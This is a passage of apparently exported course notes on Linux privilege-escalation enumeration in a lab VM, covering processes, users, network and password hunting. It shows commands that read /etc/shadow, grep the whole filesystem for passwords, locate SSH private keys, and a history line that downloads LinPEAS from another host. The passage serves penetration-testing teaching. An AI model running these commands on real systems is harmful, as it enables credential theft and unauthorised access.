some scheduled tasks on there:</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 663.00px; height: 13.80px;"><img alt="" src="images/image111.jpg" style="width: 663.00px; height: 13.80px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></li><li class="c0 c5 li-bullet-0"><span class="c9">We also see a network file share:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 710.00px; height: 26.60px;"><img alt="" src="images/image110.jpg" style="width: 710.00px; height: 26.60px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">Additionally, if you want to just see, for example, what services the root user is running, you can grep for that:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 320.00px; height: 24.80px;"><img alt="" src="images/image102.jpg" style="width: 320.00px; height: 24.80px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ ps aux | grep root</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_124-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Similarly, if we want to see all the services we are running right now, we can grep for our username:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 705.60px; height: 130.80px;"><img alt="" src="images/image100.jpg" style="width: 705.60px; height: 130.80px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ ps aux | grep TCM</span></p><p class="c3 c5"><span class="c2"></span></p><ol class="c8 lst-kix_list_125-0 start" start="6"><li class="c0 c5 li-bullet-0"><span class="c9">User Enumeration:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_126-0 start"><li class="c51 c5 c55 li-bullet-0"><span class="c9">We can run &ldquo;whoami&rdquo; to view our username, and hostname:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 242.00px; height: 76.00px;"><img alt="" src="images/image106.jpg" style="width: 242.00px; height: 76.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_126-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can run &ldquo;id&rdquo; to find out our UserID, and our GroupID (we are in the &ldquo;user&rdquo; group, so we don&rsquo;t appear to have any elevated privileges):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 39.00px;"><img alt="" src="images/image104.jpg" style="width: 624.00px; height: 39.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_126-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can run &ldquo;sudo -l&rdquo; to find out what permissions we do have, and we can see that we do have quite a few &ndash; it seems we could use quite a few commands as root with no password. &nbsp;For example, we could run &ldquo;sudo nano&rdquo; without any password, and it would work. &nbsp;More to come on that::</span></li></ul><p class="c51 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 463.00px; height: 297.00px;"><img alt="" src="images/image94.jpg" style="width: 463.00px; height: 297.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5 c49 c51"><span class="c2"></span></p><ul class="c8 lst-kix_list_127-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Next, let&rsquo;s &nbsp;type &ldquo;cat /etc/passwd&rdquo; which will show us all of our users:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 573.00px; height: 403.00px;"><img alt="" src="images/image92.jpg" style="width: 573.00px; height: 403.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ cat /etc/passwd</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_127-0"><li class="c0 c5 li-bullet-0"><span class="c9">As a trick to further distill our results down, we can type &ldquo;cat /etc/passwd | cut -d : -f 1&rdquo; which translates to, cut on the delimiter of a colon, and then show results only of field 1:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 380.00px; height: 408.00px;"><img alt="" src="images/image98.jpg" style="width: 380.00px; height: 408.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ cat /etc/passwd | cut -d : -f 1</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_127-0"><li class="c0 c5 li-bullet-0"><span class="c9">Let&rsquo;s see if we have access to any sensitive files by starting with &ldquo;cat /etc/shadow&rdquo;, and we see that we do, we will get into that later:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 257.00px;"><img alt="" src="images/image96.jpg" style="width: 624.00px; height: 257.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ cat /etc/shadow</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_127-0"><li class="c0 c5 li-bullet-0"><span class="c9">Next, along those same lines, let&rsquo;s see if we have access to any more sensitive files by typing &ldquo;cat /etc/group:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 150.00px; height: 480.00px;"><img alt="" src="images/image45.jpg" style="width: 150.00px; height: 480.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ cat /etc/group</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_127-0"><li class="c0 c5 li-bullet-0"><span class="c9">Now, let&rsquo;s see if there&rsquo;s anything interesting in our history by typing &ldquo;history&rdquo;:</span></li></ul><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ history</span></p><p class="c4 c5"><span class="c1">&nbsp; &nbsp;1 &nbsp;ls -al &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p class="c4 c5"><span class="c1">&nbsp; &nbsp; 2 &nbsp;cat .bash_history &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p><p class="c4 c5"><span class="c1">&nbsp; &nbsp; 3 &nbsp;ls -al</span></p><p class="c4 c5"><span class="c1">&nbsp; &nbsp; 4 &nbsp;mysql -h somehost.local -uroot &ndash;ppassword123</span></p><p class="c4 c5"><span class="c1">&nbsp; &nbsp; 5 exit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p><p class="c4 c5"><span class="c1">&nbsp; &nbsp; 6 &nbsp;cd /tmp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p><p class="c4 c5"><span class="c1">&nbsp; &nbsp; 7 &nbsp;clear</span></p><p class="c4 c5"><span class="c2">&nbsp; 8 &nbsp;ifconfig</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp; 9 &nbsp;netstat -antp</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;10 &nbsp;nano myvpn.ovpn </span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;11 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;12 &nbsp;cd tools/</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;13 &nbsp;mkdir linux-exploit-suggester</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;14 &nbsp;cd linux-exploit-suggester/</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;15 &nbsp;nano linux-exploit-suggester.sh</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;16 &nbsp;chmod +x linux-exploit-suggester.sh </span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;17 &nbsp;cat /etc/issue</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;18 &nbsp;uname -a</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;19 &nbsp;cat /etc/lsb-release</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;20 &nbsp;cat /etc/passwd | cut -d: -f1</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;21 &nbsp;awk -F: &#39;($3 == &quot;0&quot;) {print}&#39; /etc/passwd</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;22 &nbsp;cat /proc/version</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;23 &nbsp;uname -a</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;24 &nbsp;hostname</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;25 &nbsp;lscpu</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;26 &nbsp;cat /etc/profile</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;27 &nbsp;lpstat -a</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;28 &nbsp;cat /etc/issue</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;29 &nbsp;cat /proc/version </span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;30 &nbsp;ps aux</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;31 &nbsp;cat /etc/services </span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;32 &nbsp;ps aux | grep root</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;33 &nbsp;history</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;34 &nbsp;nano .bash_history</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;35 &nbsp;history </span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;36 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;37 &nbsp;cd tools/</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;38 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;39 &nbsp;cd linux-exploit-suggester/</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;40 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;41 &nbsp;cd ..</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;42 &nbsp;mkdir linpeas</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;43 &nbsp;cd linpeas/</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;44 &nbsp;wget </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=http://192.168.4.51/linpeas.sh&amp;sa=D&amp;source=editors&amp;ust=1699590511517966&amp;usg=AOvVaw1D_dcPOQXXcmeAFcDX6lJY">http://192.168.4.51/linpeas.sh</a></span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;45 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;46 &nbsp;chmod +x linpeas.sh </span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;47 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;48 &nbsp;cd ..</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;49 &nbsp;mkdir linenum</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;50 &nbsp;cd linenum/</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;51 &nbsp;nano linenum.sh</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;52 &nbsp;chmod +x linenum.sh </span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;53 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;54 &nbsp;cd ..</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;55 &nbsp;ls</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;56 &nbsp;cat /etc/passwd</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;57 &nbsp;cat /etc/passwd | cut &ndash;d : -f 1</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;58 &nbsp;cat /etc/passwd | cut -d : -f 1</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;59 &nbsp;cat /etc/shadow</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;60 &nbsp;cat /etc/group</span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp;61 &nbsp;history</span></p><p class="c4 c5"><span class="c2">TCM@debian:~$</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_127-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can try to see if we can access another user account by typing &nbsp;&ldquo;sudo su -&rdquo; (sudo switch user) and then our password, but we don&rsquo;t have that access at this point. It&rsquo;s always worth trying to see if we can switch into another account such as root, or one with greater privileges:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 71.00px;"><img alt="" src="images/image50.jpg" style="width: 624.00px; height: 71.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ol class="c8 lst-kix_list_128-0 start" start="7"><li class="c0 c5 li-bullet-0"><span class="c9">Network Enumeration:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_129-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We can run &ldquo;ifconfig&rdquo; which will tell us a bit about our network configuration (might not work with all versions of Linux):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 379.00px;"><img alt="" src="images/image48.jpg" style="width: 624.00px; height: 379.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_129-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can run &ldquo;ip a&rdquo; which will tell us a bit about our network configuration (might not work with all versions of Linux):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 178.00px;"><img alt="" src="images/image39.jpg" style="width: 624.00px; height: 178.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_129-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can type &ldquo;route&rdquo; which will tell us a bit more about our network configuration (might not work with all versions of Linux):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 102.00px;"><img alt="" src="images/image37.jpg" style="width: 624.00px; height: 102.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_129-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can type &ldquo;ip route&rdquo; which will tell us a bit more about our network configuration (might not work with all versions of Linux):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 611.00px; height: 80.00px;"><img alt="" src="images/image43.jpg" style="width: 611.00px; height: 80.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_129-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can type &ldquo;arp -a&rdquo; which will tell us a bit about who/what machines we are communicating with (might not work with all versions of Linux):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 42.00px;"><img alt="" src="images/image41.jpg" style="width: 624.00px; height: 42.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_129-0"><li class="c0 c5 li-bullet-0"><span class="c9">Similarly, we can type &ldquo;ip neigh&rdquo; which will tell us a bit about who/what machines we are communicating with (might not work with all versions of Linux):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 472.00px; height: 64.00px;"><img alt="" src="images/image32.jpg" style="width: 472.00px; height: 64.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_129-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can also type &ldquo;netstat -ano&rdquo; which will tell us what ports are open, and which machines we are communicating with (might not work with all versions of Linux):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 539.00px;"><img alt="" src="images/image31.jpg" style="width: 624.00px; height: 539.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ol class="c8 lst-kix_list_130-0 start" start="8"><li class="c0 c5 li-bullet-0"><span class="c9">Password Enumeration:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_131-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We can use grep for this by typing: </span><span class="c2">grep --color=auto -rnw &#39;/&#39; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</span></li></ul><p class="c24 c5"><span class="c9">-This will look for the word &quot;password&quot; anywhere in files and color any findings in red:</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 255.00px;"><img alt="" src="images/image35.png" style="width: 624.00px; height: 255.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_132-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Let&rsquo;s narrow down our results as that was a very broad search. &nbsp;Let&rsquo;s add an equal sign to password: </span><span class="c19">&nbsp;</span></li></ul><p class="c4 c5"><span class="c2">TCM@debian:~$ grep --color=auto -rnw &#39;/&#39; -ie &quot;PASSWORD=&quot; --color=always 2&gt; /dev/null</span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_133-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We could also search for passwords with the following command:</span></li></ul><p class="c4 c5"><span class="c1">TCM@debian:~$ grep --color=auto -rnw &#39;/&#39; -ie &quot;PASS=&quot; --color=always 2&gt; /dev/null</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 114.00px;"><img alt="" src="images/image65.jpg" style="width: 624.00px; height: 114.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_134-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We can also search for passwords with the following command:</span></li></ul><p class="c4 c5"><span class="c1">TCM@debian:~$ locate password | more</span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_135-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We could even search for passwords with the following command:</span></li></ul><p class="c4 c5"><span class="c1">TCM@debian:~$ locate pass | more</span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_136-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We could also search for passwords with the following command:</span></li></ul><p class="c4 c5"><span class="c1">TCM@debian:~$ locate pwd | more</span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_137-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We could also search for ssh keys with the following command:</span></li></ul><p class="c4 c5"><span class="c1">TCM@debian:~$ find / -name id_rsa 2&gt; /dev/null</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 457.00px; height: 63.00px;"><img alt="" src="images/image63.jpg" style="width: 457.00px; height: 63.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_138-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We could also search for ssh keys with the following command:</span></li></ul><p class="c4 c5"><span class="c1">TCM@debian:~$ find / -name authorized_keys 2&gt; /dev/null</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 527.00px; height: 41.00px;"><img alt="" src="images/image69.jpg" style="width: 527.00px; height: 41.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ol class="c8 lst-kix_list_130-0" start="9"><li class="c0 c5 li-bullet-0"><span class="c9">Automated Tools for Enumeration:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_139-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">LinPEAS Tool: </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&amp;sa=D&amp;source=editors&amp;ust=1699590511523021&amp;usg=AOvVaw0rZzHHdrV08i-BanzPTSRm">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></span></li><li class="c0 c5 li-bullet-0"><span class="c2">WinPEAS: </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/carlospolop/PEASS-ng&amp;sa=D&amp;source=editors&amp;ust=1699590511523569&amp;usg=AOvVaw05U-jjZT2kfEo4DuZ-3Db7">https://github.com/carlospolop/PEASS-ng</a></span></li><li class="c0 c5 li-bullet-0"><span class="c2">LinEnum: </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/rebootuser/LinEnum&amp;sa=D&amp;source=editors&amp;ust=1699590511523999&amp;usg=AOvVaw332cBxCeQcDfOJT0vQcPgd">https://github.com/rebootuser/LinEnum</a></span></li><li class="c0 c5 li-bullet-0"><span class="c1">Linux Exploit Suggester: </span><span class="c13"><a class="c6" href="https://www.google.com/url?q=https://github.com/The-Z-Labs/linux-exploit-suggester&amp;sa=D&amp;source=editors&amp;ust=1699590511524403&amp;usg=AOvVaw0wlWaIrHhUWsmmfxo_pnJk">https://github.com/The-Z-Labs/linux-exploit-suggester</a></span></li><li class="c0 c5 li-bullet-0"><span class="c2">Linux Priv Checker: </span><span class="c11"><a class="c6" 